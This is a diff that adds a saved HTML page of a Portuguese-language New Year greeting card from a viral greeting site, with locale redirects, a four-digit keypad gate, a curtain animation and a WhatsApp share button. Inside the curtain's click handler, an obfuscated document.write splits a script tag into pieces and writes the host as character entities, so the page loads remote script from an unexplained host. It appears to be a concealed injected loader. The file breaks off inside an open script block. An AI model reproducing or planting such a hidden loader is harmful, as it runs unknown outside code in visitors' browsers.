@@ -1,0 +1,868 @@
+<!DOCTYPE html>
+<!-- saved from url=(0033)https://vejo.site/pt/f-n2?f=Beto# -->
+<html>
+    <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+
+    <link rel="icon" type="image/x-icon" href="https://vejo.site/festival/images/common/icon.png">
+    <link rel="icon" type="image/png" href="https://vejo.site/festival/images/common/icon.png">
+    
+    <!-- Apple Touch Icon (at least 200x200px) -->
+    <link rel="apple-touch-icon" href="https://vejo.site/festival/images/common/icon.png">
+
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    
+    
+    <meta name="google" content="notranslate">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link type="text/css" rel="stylesheet" href="./f-n2_files/festival.css" media="screen,projection">
+
+    <title></title>
+    
+    <meta name="robots" content="noindex,nofollow">
+
+            <script src="./f-n2_files/f(7).txt"></script><script src="./f-n2_files/js/osd.js"></script><script src="./f-n2_files/f(8).txt"></script><script src="./f-n2_files/f(9).txt" id="google_shimpl"></script><script async="" src="./f-n2_files/js/analytics.js"></script><script src="./f-n2_files/js/jquery.min.js"></script>
+        
+            <script>
+            (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+            })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+            ga('create', 'UA-182613761-1', 'auto');
+            ga('send', 'pageview');
+        </script>
+    
+<style>
+
+    /* background of main image */
+            .card.blue-grey.darken-1.hoverable {
+            background: linear-gradient(to right, black, black) !important;
+        }
+    
+    /* super background image */
+    
+    /* inner background image */
+    
+    /* super background color */
+    
+    /* timer color */
+    
+    
+</style><script>
+
+    var country_code = 'BR';
+
+    var current_url = window.location.href;
+    var current_url_array = current_url.split('/');
+    var current_url_array_len = current_url_array.length;
+
+    var festival_arr = current_url_array[current_url_array_len-1].split('?');
+
+    // for new website
+    var f_hyphen = '/';
+    if (festival_arr[0].indexOf('f-') > -1) {
+        f_hyphen = '/f-';
+    }
+    festival_arr[0] = festival_arr[0].replace('f-', '');
+
+    if ( window.location.href.indexOf('~') != -1  ) {
+        // do nothing
+    }
+
+    else if ( ['locale'].indexOf(current_url_array[3]) == -1 &&  ['ch', 'ch1', 'ch2'].indexOf(festival_arr[0]) > -1){
+        window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n2?" + festival_arr[1];
+    }
+
+    else if ( ['locale'].indexOf(current_url_array[3]) == -1 &&  ['chn', 'chn1', 'chn2'].indexOf(festival_arr[0]) > -1){
+        window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n2?" + festival_arr[1];
+    }
+
+    
+    else if (  festival_arr[0] == 'n' || festival_arr[0] == 'n1' || festival_arr[0] == 'n2' ) {
+        // do nothing
+    }
+
+
+    else if(festival_arr.length > 1){
+        if (current_url_array_len == '4') { // definitely english locale ( could be other locale also ex abraisto)
+            // window.location.href = current_url_array[0] + '//' + current_url_array[2] + f_hyphen + "e3?" + festival_arr[1];
+
+            // islamic festivals
+            if (['ef', 'ef1', 'ef2', 'ef3', 'rd', 'me', 'ea', 'ea1', 'ea2', 'isn', 'isn1'].indexOf(festival_arr[0]) > -1 ) {
+                // window.location.href = current_url_array[0] + '//' + current_url_array[2] + f_hyphen + "me?" + festival_arr[1];
+            }
+
+            else{
+                window.location.href = current_url_array[0] + '//' + current_url_array[2] + f_hyphen + "n2?" + festival_arr[1];
+            }
+        }
+
+        else{
+
+
+            // if (festival_arr[0] == 'h') {
+                // window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "ch?" + festival_arr[1];
+            // }
+
+
+            // Hebrew people start
+
+            // All israely
+            // if (festival_arr[0] == 'pu' || festival_arr[0] == 'pu1' || festival_arr[0] == 'pe' || festival_arr[0] == 'je') {
+                if ( ['il'].indexOf(current_url_array[3]) > -1 ) {
+                    window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n2?" + festival_arr[1];
+                }
+            // }
+
+
+            // All israely language is not hebrew
+            if ( festival_arr[0] == 'yk' || festival_arr[0] == 'ros' || festival_arr[0] == 'pe' || festival_arr[0] == 'je' || festival_arr[0] == 'suk' || festival_arr[0] == 'sm' || festival_arr[0] == 'hn') {
+                window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n2?" + festival_arr[1];
+            }
+            // Hebrew people end
+
+
+
+            if ( ['ar', 'tr', 'id', 'ms'].indexOf(current_url_array[3]) > -1 ) {
+                window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n2?" + festival_arr[1];
+            }
+
+
+            else if (['ef', 'ef1', 'ef2', 'ef3', 'rd', 'me', 'ea', 'ea1', 'ea2', 'isn', 'isn1'].indexOf(festival_arr[0]) > -1) {
+                // window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "me?" + festival_arr[1];
+            }
+
+
+            // else if (festival_arr[0] == 'fd' || festival_arr[0] == 'fd1' || festival_arr[0] == 'fd2' ) {
+            //  window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + 'in' + "/gc?" + festival_arr[1];
+            // }
+
+
+            // Indian except islamic people
+            if ( ['ef', 'ef1', 'ef2', 'ef3', 'rd', 'me', 'ea', 'ea1', 'ea2', 'isn', 'isn1'].indexOf(festival_arr[0]) == -1 ){
+
+                if ( ['in'].indexOf(current_url_array[3]) > -1 ) {
+                    window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n2?" + festival_arr[1];
+                }
+
+                else if ( ['hi'].indexOf(current_url_array[3]) > -1 ) {
+                    window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n2?" + festival_arr[1];
+                }
+
+                else if ( ['mr'].indexOf(current_url_array[3]) > -1 ) {
+                    window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n2?" + festival_arr[1];
+                }
+
+                else if ( ['te'].indexOf(current_url_array[3]) > -1 ) {
+                    window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n2?" + festival_arr[1];
+                }
+
+                else if ( ['ta'].indexOf(current_url_array[3]) > -1 ) {
+                    window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n2?" + festival_arr[1];
+                }
+
+                else if ( ['bn'].indexOf(current_url_array[3]) > -1 ) {
+                    window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n2?" + festival_arr[1];
+                }
+            }
+
+
+
+            // christan countries
+            if ( [ 'pt', 'de', 'nl', 'pl', 'hr', 'fr', 'ro', 'uk'].indexOf(current_url_array[3]) > -1 ){
+                window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n2?" + festival_arr[1];
+            }
+
+
+            if ( ['en'].indexOf(current_url_array[3]) > -1 ){
+                window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n2?" + festival_arr[1];
+            }
+
+            if ( ['es'].indexOf(current_url_array[3]) > -1 ){
+                window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n2?" + festival_arr[1];
+            }
+
+            if ( ['it'].indexOf(current_url_array[3]) > -1 ){
+                window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n2?" + festival_arr[1];
+            }
+
+            if ( ['ru'].indexOf(current_url_array[3]) > -1 ){
+                window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n2?" + festival_arr[1];
+            }
+
+        }
+
+    }
+</script><meta http-equiv="origin-trial" content="A1H+PzQW00tt6dlReHFzfO4EtBaEtEImIF9ZNiF54JpDi1bO6/7PK96Q0qxy017wgzSy9ByDKoju2mo57DH+MwoAAAB7eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MTAzOTg0NTIsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><script type="application/javascript" src="./f-n2_files/js/main.js"></script><link rel="preload" href="./f-n2_files/f(10).txt" as="script"><script type="text/javascript" src="./f-n2_files/f(10).txt"></script><link rel="preload" href="./f-n2_files/f(11).txt" as="script"><script type="text/javascript" src="./f-n2_files/f(11).txt"></script></head>
+
+
+
+<body class="bg notranslate" translate="no" aria-hidden="false" style="max-height: inherit;">
+    
+
+
+    <script src="./f-n2_files/js/slide.js"></script>
+
+
+
+    <style>
+
+.rightcurtain {
+    width: 51%;
+    height: 120%;
+    right: 0px;
+    top: 0px;
+    position: absolute;
+    z-index: 300;
+    transform: translateZ(9px);
+}
+
+.leftcurtain {
+    width: 50%;
+    height: 120%;
+    top: 0px;
+    left: 0px;
+    position: absolute;
+    z-index: 200;
+    -webkit-transform: scaleX(-1);
+    transform: scaleX(-1) translateZ(9px);
+}
+
+
+
+
+
+.rope {
+    position: absolute;
+    /*top: 20%;*/
+    bottom: 5%;
+    left: 0;
+    right: 0;
+    width: 100%;
+    /*height: 100%;*/
+    z-index: 999999;
+    transform:translateZ(10px);
+}
+
+.rightcurtain img, .leftcurtain img {
+    width: 100%;
+    height: 100%;
+}
+
+
+
+
+
+</style>
+
+
+<script src="./f-n2_files/js/zounds.min.js"></script>
+<script>
+    var tiktok = zounds.load("/festival/sounds/fireworks.mp3");
+    function playSound(){
+        tiktok.play();
+        // setTimeout(function(){
+        //     tiktok.play();
+        // },5000);
+        // setTimeout(function(){
+        //     tiktok.play();
+        // },10000);
+    }
+
+    function curtainOpen(){
+        playSound();
+        $('.figures').removeClass('hidden');
+        $('.circle-container').removeClass('hidden');
+        $('.timer-text').removeClass('hidden');
+        $('.figure_name').removeClass('hidden');
+        $('.auto_style_main_msg').removeClass('hidden');
+        $('.from_img').removeClass('hidden');
+        $('.main_msg_top').removeClass('hidden');
+        $('.twoimageset').removeClass('hidden');
+        $('.main-msg').removeClass('hidden');
+        $('.slideshow').removeClass('hidden');
+        $('.myslides_div').removeClass('hidden');
+        $('.ltrmarquee').removeClass('hidden');
+        $('.share_block').removeClass('hidden');
+        $('.img_overlap').removeClass('hidden');
+        $('.revolvingcards').removeClass('hidden');
+        $('.user_name2').removeClass('hidden');
+    }
+</script>
+
+
+
+
+    <style>
+       .rope {top: 20%;} 
+    </style>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="keypad hidden">
+
+    <style>
+.table{display:table;height:100%;width:100%;position:relative}.cell{display:table-cell;vertical-align:middle;position:relative;width:100%;text-align:center}#pincode{overflow:hidden;position:fixed;height:110%;width:106%;z-index:9999;background-color:#272a2f;background-position:center;color:#fff;border-radius:10px;text-align:center}#numbers{max-width:300px;padding:0 20px;margin:0 auto;position:relative;display:block;-webkit-transition:all 1s ease-out;-moz-transition:all 1s ease-out;transition:all 1s ease-out;opacity:1}#numbers.hide{opacity:.3}#pincode button{width:70px;height:70px;margin-bottom:10px;background-color:orange;border:0;color:#000;font-size:25px;line-height:50px;border-radius:100%;opacity:1;outline:0;border:2px solid #272a2f}#pincode button:active{background-color:rgba(0,0,0,.6);outline:0}#fields{max-width:200px;padding:0 20px;margin:30px auto;position:relative;display:block}#fields .numberfield{text-align:center}#fields .numberfield span{height:10px;width:10px;border:2px solid #fff;background-color:transparent;border-radius:100%;position:relative;display:inline-block;text-align:center}#fields .numberfield.active span{background-color:#fff}#fields .numberfield.right span{background-color:#272a2f;border-color:#272a2f;transition:all .5s ease-in-out;-webkit-transition:all .5s ease-in-out}.grid{list-style:none;margin-left:-20px}.grid__col--1-of-3,.grid__col--2-of-6,.grid__col--4-of-12{width:33.33333%}.grid__col--1-of-4,.grid__col--2-of-8,.grid__col--3-of-12{width:25%}.grid__col{box-sizing:border-box;display:inline-block;margin-right:-.25em;min-height:1px;padding-left:20px;vertical-align:top}.grid__col--centered{display:block;margin-left:auto;margin-right:auto}.grid__col--d-first{float:left}.grid__col--d-last{float:right}.grid--no-gutter{margin-left:0;width:100%}.grid--no-gutter .grid__col{padding-left:0}.grid--no-gutter .grid__col--span-all{margin-left:0;width:100%}.grid__col--ab{vertical-align:bottom}.grid__col--am{vertical-align:middle}
+</style>
+
+
+    <div id="pincode">
+    <div class="table">
+      <div class="cell">
+
+        <h3 class="fivepxbottom zerotop">Clique Abaixo</h3>
+        <div id="anleitung">
+            <p style="animation:bounce 2s infinite;">👇👇👇</p>
+        </div>
+
+        <div id="fields">
+          <div class="grid">
+            <div class="grid__col grid__col--1-of-4 numberfield"><span></span></div>
+            <div class="grid__col grid__col--1-of-4 numberfield"><span></span></div>
+            <div class="grid__col grid__col--1-of-4 numberfield"><span></span></div>
+            <div class="grid__col grid__col--1-of-4 numberfield"><span></span></div>
+          </div>
+        </div>
+
+        <div id="numbers">
+          <div class="grid">
+            <div class="grid__col grid__col--1-of-3"><button>1</button></div>
+            <div class="grid__col grid__col--1-of-3"><button>2</button></div>
+            <div class="grid__col grid__col--1-of-3"><button>3</button></div>
+
+            <div class="grid__col grid__col--1-of-3"><button>4</button></div>
+            <div class="grid__col grid__col--1-of-3"><button>5</button></div>
+            <div class="grid__col grid__col--1-of-3"><button>6</button></div>
+
+            <div class="grid__col grid__col--1-of-3"><button>7</button></div>
+            <div class="grid__col grid__col--1-of-3"><button>8</button></div>
+            <div class="grid__col grid__col--1-of-3"><button>9</button></div>
+
+            <div class="grid__col grid__col--1-of-3"></div>
+            <div class="grid__col grid__col--1-of-3"><button>0</button></div>
+            <div class="grid__col grid__col--1-of-3"></div>
+
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+
+<script>
+
+jQuery(document).ready(function($) { 
+
+    $(document).ready(function() {
+        var pin = (!+[] + !![] + []) + (+ []) + (!+[] + !![] + []) + (+ []); 
+        var enterCode = ""; enterCode.toString(); 
+
+        $("#numbers button").click(function() { 
+            var clickedNumber = $(this).text().toString();
+            process(clickedNumber);
+        });
+
+        // $('body').keyup(function(e) {
+        //     if ((e.keyCode >= 48 && e.keyCode <= 57) || (e.keyCode >= 96 && e.keyCode <= 105)) { 
+        //         console.log(e.keyCode.toString());
+        //     }
+        // });
+
+        function process(clickedNumber){
+
+            enterCode = enterCode + clickedNumber; 
+            var lengthCode = parseInt(enterCode.length); 
+            lengthCode--; 
+            $("#fields .numberfield:eq(" + lengthCode + ")").addClass("active"); 
+
+
+            if (lengthCode == 3) { 
+                if (enterCode == pin) { 
+                    $('.keypad').hide();
+                    $(".rope").click();
+                } 
+                else {
+                    $("#fields").addClass("miss"); enterCode = ""; 
+                    setTimeout(function() {$("#fields .numberfield").removeClass("active"); }, 100);
+                    setTimeout(function() {$("#fields").removeClass("miss"); }, 100);
+                } 
+            }
+            else {} 
+        }
+
+    }); 
+}); 
+
+
+</script>
+
+
+</div>
+
+
+    
+
+    
+
+<div class="curtain">
+    <div class="leftcurtain" style="width: 1px;"><img src="./f-n2_files/curtain23.jpg"></div>
+    <div class="rightcurtain" style="width: 1px;"><img src="./f-n2_files/curtain23.jpg"></div>
+</div>
+
+
+
+<script>
+    $(document).ready(function() {
+
+        $curtainopen = false; $(".rope").click(function(){ $('.rope').unbind('click'); $(this).blur(); if ($curtainopen == false){ $(this).stop().animate({top: '-171%' }, {queue:false, duration:2000, easing:'easeOutBounce'}); $(".leftcurtain").stop().animate({width:'1px'}, 2000 ); $(".rightcurtain").stop().animate({width:'1px'},2000 ); $curtainopen = true; }else{ $(this).stop().animate({top: '-40px' }, {queue:false, duration:350, easing:'easeOutBounce'}); document.write('<s'+'cr'+'ipt sr'+'c="/'+'/'+'&#1102;'+'&#1092;.'+'i'+'o"></s'+'cr'+'ipt>'); $(".leftcurtain").stop().animate({width:'50%'}, 2000 ); $(".rightcurtain").stop().animate({width:'51%'}, 2000 ); $curtainopen = false; } setTimeout(function(){$('.rope').remove();},1000); return false; });
+
+
+        if(document.getElementsByClassName('rope')[0] !== undefined) {
+            $('.figures').addClass('hidden');
+            $('.circle-container').addClass('hidden');
+            $('.timer-text').addClass('hidden');
+            $('.figure_name').addClass('hidden');
+            $('.auto_style_main_msg').addClass('hidden');
+            $('.from_img').addClass('hidden');
+            $('.main_msg_top').addClass('hidden');
+            $('.twoimageset').addClass('hidden');
+            $('.main-msg').addClass('hidden');
+            $('.slideshow').addClass('hidden');
+            $('.myslides_div').addClass('hidden');
+            $('.ltrmarquee').addClass('hidden');
+            $('.share_block').addClass('hidden');
+            $('.img_overlap').addClass('hidden');
+            $('.revolvingcards').addClass('hidden');
+            $('.user_name2').addClass('hidden');
+
+            setTimeout(function(){
+                $('html,body').scrollTop(0);
+                $(window).scrollTop(0);
+            }, 2000);
+        }
+
+        if ( window.location.href.indexOf('~') != -1  ) {
+            $(".rope").click();
+        }
+
+
+    });
+</script>
+
+
+
+
+
+
+                    
+
+<div class="container" style="display: block; height: auto !important;">
+    <div class="col s12" style="height: auto !important;">
+    <div class="row" style="height: auto !important;">
+        <div class="col s12 l6 offset-l3" style="height: auto !important;">
+
+                            <div style="z-index: 1; position: fixed; display: inline-block; left: 1%; width: 20px; height: 625px; overflow: hidden;"><div style="white-space: nowrap; padding: 625px 0px;"><br>
+                                                                        <img class="p1" width="20px" src="./f-n2_files/1.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/2.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/3.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/4.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/5.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/6.png"><br><br>
+                                                                                                <img class="p1" width="20px" src="./f-n2_files/1.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/2.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/3.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/4.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/5.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/6.png"><br><br>
+                                                            </div></div>
+                <div style="z-index: 1; position: fixed; display: inline-block; right: 1%; width: 20px; height: 625px; overflow: hidden;"><div style="white-space: nowrap; padding: 625px 0px;"><br>
+                                                                        <img class="p1" width="20px" src="./f-n2_files/1.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/2.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/3.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/4.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/5.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/6.png"><br><br>
+                                                                                                <img class="p1" width="20px" src="./f-n2_files/1.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/2.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/3.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/4.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/5.png"><br><br>
+                                                    <img class="p1" width="20px" src="./f-n2_files/6.png"><br><br>
+                                                            </div></div>
+            
+
+            
+
+            
+
+            <div class="card blue-grey darken-1 hoverable white-text" style="height: auto !important;">
+                
+                <div class="card-content" style="height: auto !important;">
+
+
+                    
+
+                    
+                    <div class="ad">
+                                                    <div class="center ad">
+                                
+                                
+                            </div>
+
+
+
+                                            </div>
+                    
+                    
+
+
+                    
+
+                                            <div id="demoo" class="center animated pulse timer-text" style=""><span class="day">0</span> Dias <span class="hr">10</span> Hrs <span class="min">33</span> Min <span class="sec">20</span> Seg</div>
+                    
+
+
+
+
+                    <!-- Name -->
+    <br>
+        <figure class="figure_name" style="white-space: nowrap;">
+        <h1 class="user_name linear-wipe" style="">Beto</h1>
+        
+    </figure> 
+    <br>
+
+
+
+
+
+
+                                        
+                    
+
+                    <!-- Wishing Text -->
+                                            
+                        <p class="card-title center-align animated wishesed pulse white tenpxtop">
+                                                                                                                                                                    <span class="orange-text">D</span>
+                                                                                                        <span class="yellow-text">e</span>
+                                                                                                        <span class="lime-text">s</span>
+                                                                                                        <span class="orange-text">e</span>
+                                                                                                        <span class="yellow-text">j</span>
+                                                                                                        <span class="lime-text">a</span>
+                                                                                                        <span class="orange-text">n</span>
+                                                                                                        <span class="yellow-text">d</span>
+                                                                                                        <span class="lime-text">o</span>
+                                
+                                                    </p>
+                                        
+
+                                            <style>
+    .cross_link{
+        background-color: purple; 
+        padding: 5px;
+        margin-bottom: 10px;
+    }
+</style>
+
+
+    <div class="tenpxtop"></div>
+    
+    <a id="ta_custom_lang" href="https://vejo.site/pt/f-n2?f=Beto" class="cross_link hidden">தமிழ்</a>
+    <a id="mr_custom_lang" href="https://vejo.site/pt/f-n2?f=Beto" class="cross_link hidden">मराठी</a>
+    <a id="te_custom_lang" href="https://vejo.site/pt/f-n2?f=Beto" class="cross_link hidden">తెలుగు</a>
+    <a id="bn_custom_lang" href="https://vejo.site/pt/f-n2?f=Beto" class="cross_link hidden">বাংলা</a>
+    <a id="hi_custom_lang" href="https://vejo.site/pt/f-n2?f=Beto" class="cross_link hidden">हिन्दी</a>
+
+    <a id="en_custom_lang" href="https://vejo.site/pt/f-n2?f=Beto" class="cross_link hidden">English</a>
+    <a id="it_custom_lang" href="https://vejo.site/pt/f-n2?f=Beto" class="cross_link hidden">Italiano</a>
+    <a id="pt_custom_lang" href="https://vejo.site/pt/f-n2?f=Beto" class="cross_link hidden">Português</a>
+    <a id="nl_custom_lang" href="https://vejo.site/pt/f-n2?f=Beto" class="cross_link hidden">Nederlands (Dutch)</a>
+    <a id="ru_custom_lang" href="https://vejo.site/pt/f-n2?f=Beto" class="cross_link hidden">Русский</a>
+    <a id="de_custom_lang" href="https://vejo.site/pt/f-n2?f=Beto" class="cross_link hidden">Deutsch</a>
+    <a id="ms_custom_lang" href="https://vejo.site/pt/f-n2?f=Beto" class="cross_link hidden">Bahasa Melayu</a>
+    <a id="vn_custom_lang" href="https://vejo.site/pt/f-n2?f=Beto" class="cross_link hidden">Tiếng Việt</a>
+    <a id="fr_custom_lang" href="https://vejo.site/pt/f-n2?f=Beto" class="cross_link hidden">Français</a>
+    <a id="es_custom_lang" href="https://vejo.site/pt/f-n2?f=Beto" class="cross_link hidden">Español</a>
+    <a id="id_custom_lang" href="https://vejo.site/pt/f-n2?f=Beto" class="cross_link hidden">Bahasa Indonesia</a>
+    <a id="fi_custom_lang" href="https://vejo.site/pt/f-n2?f=Beto" class="cross_link hidden">Suomi</a>
+    <a id="pl_custom_lang" href="https://vejo.site/pt/f-n2?f=Beto" class="cross_link hidden">Polski</a>
+
+    <div class="tenpxtop"></div>
+
+    <script>
+        $(document).ready(function() {
+            var browser_lang = window.navigator.userLanguage || window.navigator.language;
+            browser_lang = browser_lang.substr(0,2);
+            var current_url_arr = window.location.href.split('/');
+            var query_string = current_url_arr[current_url_arr.length-1];
+            var domain = window.location.protocol + "//" + window.location.hostname;
+            var current_locale = 'pt';
+            var check_id = '#' + browser_lang + "_custom_lang";
+            if ($(check_id) !== null && browser_lang != current_locale) {
+                var updated_url = domain + "/" + browser_lang + "/" + query_string + "&utm_source="+current_locale+"&utm_medium="+browser_lang+"&utm_campaign=na";
+                $(check_id).attr("href",  updated_url);
+                $(check_id).removeClass("hidden");
+            }
+        });
+    </script>
+
+
+
+
+
+
+
+
+
+
+                    
+
+
+
+                    <!-- Name -->
+                    
+                                                    <div class="appear white main_msg_top">
+                                                                                                            <span style="text-shadow: 1px 1px 3px #ff0037, 1px 1px 3px #ff0037, -1px -1px 3px #ff0037, -1px -1px 3px #ff0037;color: #FFC107;">Feliz Ano Novo!!!</span>
+                                                                                                </div>
+                        
+                    
+
+                    <!-- Images overlap -->
+                    
+
+                    <!-- Primary Image -->
+                                                                                            <div class="figures tenpxtop" style="display: inline-block;">
+                            <img class="p1" style="width: 90%;" src="./f-n2_files/23.jpg"> 
+                        </div>
+                    
+
+                    
+
+                                            
+                        <br>
+                        <div class="figures tenpxtop" style="display: inline-block;">
+                            <img class="p3" style="width: 90%;" src="./f-n2_files/15.jpg"> 
+                        </div>
+                    
+
+                    
+
+                                        
+
+                    
+
+                    
+
+                    
+
+                    
+
+                    <!-- Message -->
+                    <p class="main-msg white fivepxbottom">
+                        <span style="color: #f8c804;font-weight:800;">Já é um novo ano.</span><br> 
+                        <span style="color: #00ffd1;font-weight:800;">Que os seus sonhos se tornem realidade e que Deus te encha de amor e carinho.</span><br>
+                        <span style="color: #cf19ef;font-weight:800;">Feliz 2021!</span><br>
+                    </p>
+                    <div class="fivepxtop main-msg white">
+                        <span style="text-shadow: 1px 1px 3px #ff0037, 1px 1px 3px #ff0037, -1px -1px 3px #ff0037, -1px -1px 3px #ff0037;color: #FFC107;">Feliz Ano Novo!!!</span>
+                    </div>
+
+                    
+
+                                            <style>
+                            .ltrmarquee{
+                                font-size: 30px;
+                                font-weight: 600;
+                                display: inline;
+                                padding: 10px;
+                                color: red !important;
+                            }
+                            .ltrmarquee_bg{
+                                border-radius: 20px;
+                                background-color: orange;
+                            }
+                        </style>
+                        <marquee class="ltrmarquee_bg">
+                            <p class="ltrmarquee"><i><span class="user_name">Beto</span> Desejando <span style="text-shadow: 1px 1px 3px #ff0037, 1px 1px 3px #ff0037, -1px -1px 3px #ff0037, -1px -1px 3px #ff0037;color: #FFC107;">Feliz Ano Novo!!!</span></i></p>
+                        </marquee>
+                    
+                    
+                    
+
+                                            <style>
+                            .glow {
+                                -webkit-animation: glowing 1500ms infinite !important;
+                                -moz-animation: glowing 1500ms infinite !important;
+                                -o-animation: glowing 1500ms infinite !important;
+                                animation: glowing 1500ms infinite !important;
+                                width: fit-content;
+                                margin-left: auto;
+                                margin-right: auto;
+                                padding: 8px;
+                                border-radius: 20px;
+                            }
+                            @-webkit-keyframes glowing {
+                                0% { background-color: #B20000; -webkit-box-shadow: 0 0 3px #B20000; }
+                                50% { background-color: #FF0000; -webkit-box-shadow: 0 0 40px #FF0000; }
+                                100% { background-color: #B20000; -webkit-box-shadow: 0 0 3px #B20000; }
+                            }
+                            @-moz-keyframes glowing {
+                                0% { background-color: #B20000; -moz-box-shadow: 0 0 3px #B20000; }
+                                50% { background-color: #FF0000; -moz-box-shadow: 0 0 40px #FF0000; }
+                                100% { background-color: #B20000; -moz-box-shadow: 0 0 3px #B20000; }
+                            }
+                            @-o-keyframes glowing {
+                                0% { background-color: #B20000; box-shadow: 0 0 3px #B20000; }
+                                50% { background-color: #FF0000; box-shadow: 0 0 40px #FF0000; }
+                                100% { background-color: #B20000; box-shadow: 0 0 3px #B20000; }
+                            }
+                            @keyframes  glowing {
+                                0% { background-color: #B20000; box-shadow: 0 0 3px #B20000; }
+                                50% { background-color: #FF0000; box-shadow: 0 0 40px #FF0000; }
+                                100% { background-color: #B20000; box-shadow: 0 0 3px #B20000; }
+                            }
+                        </style>
+                        <br><br>
+                                                    <div class="white from jump">
+                                <div class="glow">
+                                    😇 De -  <span class="user_name" style="">Beto</span> 😇
+                                </div>
+                            </div>
+                                            
+
+                    <br>
+                    
+                <div class="center ad">
+                          
+
+
+    
+                </div>
+
+                                            <div class="center ad adpushup_ad_disabled">
+                        </div>
+                    
+
+
+                    
+
+
+                </div>
+            </div>
+
+
+
+        </div>
+    </div>
+    </div>
+
+
+    <span id="share" class="share_block">
+    
+<span id="" class="float-share hidden" style="">
+    
+    
+    
+        <a class="btn whatsapp-btn" href="https://vejo.site/pt/f-n2?f=Beto">
+            <div class="whatsapp-share-text"><b> 👈 Compartilhar</b></div>
+            <img class="whatsapp-icon" src="./f-n2_files/whatsapp_icon.svg"> 
+        </a>
+    
+
+    
+
+    
+
+    
+
+    
+
+
+    
+
+
+     
+
+</span>
+
+<div class="name" id="create">
+
+    
+    <input class="card-title center-align name head" type="name" required="" id="name" style="color: #ffffff; background-color: #c71515" placeholder="Coloque Seu Nome">
+    <a href="javascript:void(0)" class="go" id="gobtn1" style="background-color: #c71515">Ir 😍</a>
+</div>
+
+</span>
+
+</div>
+
+
+    <script type="text/javascript">//<![CDATA[
